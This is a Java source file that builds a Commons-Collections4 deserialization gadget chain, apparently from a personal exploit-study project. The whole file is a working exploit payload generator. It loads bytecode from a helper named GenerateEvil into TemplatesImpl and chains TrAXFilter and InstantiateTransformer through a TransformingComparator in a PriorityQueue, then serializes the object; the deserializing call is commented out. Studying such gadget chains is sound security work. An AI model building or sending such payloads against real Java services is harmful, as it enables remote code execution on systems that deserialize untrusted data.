package com.example.cc4;

import com.example.Utils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;

import javax.xml.transform.Templates;
import java.util.PriorityQueue;

public class ComparatorExec {
    public static void main(String[] args) throws Exception{
        byte[] code = Utils.GenerateEvil();
        TemplatesImpl obj = new TemplatesImpl();
        Utils.SetValue(obj, "_name","0w0");
        Utils.SetValue(obj, "_bytecodes", new byte[][]{code});
        Utils.SetValue(obj, "_tfactory", new TransformerFactoryImpl());

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[] { Templates.class }, new Object[] { obj })
        };
        Transformer transformerChain = new ChainedTransformer(transformers);

        TransformingComparator transformingComparator = new TransformingComparator<>(transformerChain);
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
        priorityQueue.add(1);
        priorityQueue.add(2);

        String barr = Utils.Serialize(priorityQueue);
//        Utils.UnSerialize(barr);
    }
}
